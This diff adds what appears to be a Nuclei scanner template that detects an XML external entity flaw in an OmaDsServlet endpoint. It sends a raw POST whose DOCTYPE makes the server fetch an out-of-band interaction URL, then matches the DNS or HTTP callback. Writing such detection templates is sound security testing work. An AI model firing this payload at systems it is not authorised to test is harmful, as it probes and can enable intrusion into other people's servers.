@@ -1,0 +1,26 @@
+id: xxe-servlet
+
+info:
+  name: OmaDsServlet XXE
+  author: root
+  severity: high
+
+http:
+  - raw:
+    - |
+       POST /servlets/OmaDsServlet HTTP/1.1
+       Host: {{Hostname}}
+       Content-Type: application/xml
+       Content-Length: 147
+
+       <?xml version="1.0"?>
+       <!DOCTYPE cdl [<!ENTITY % test SYSTEM "http://{{interactsh-url}}">%test;]>
+       <cdl>test</cdl>
+
+    matchers-condition: and
+    matchers:
+       - type: word
+         part: interactsh_protocol # Confirms the DNS,HTTP Interaction
+         words:
+          - "dns"
+          - "http"
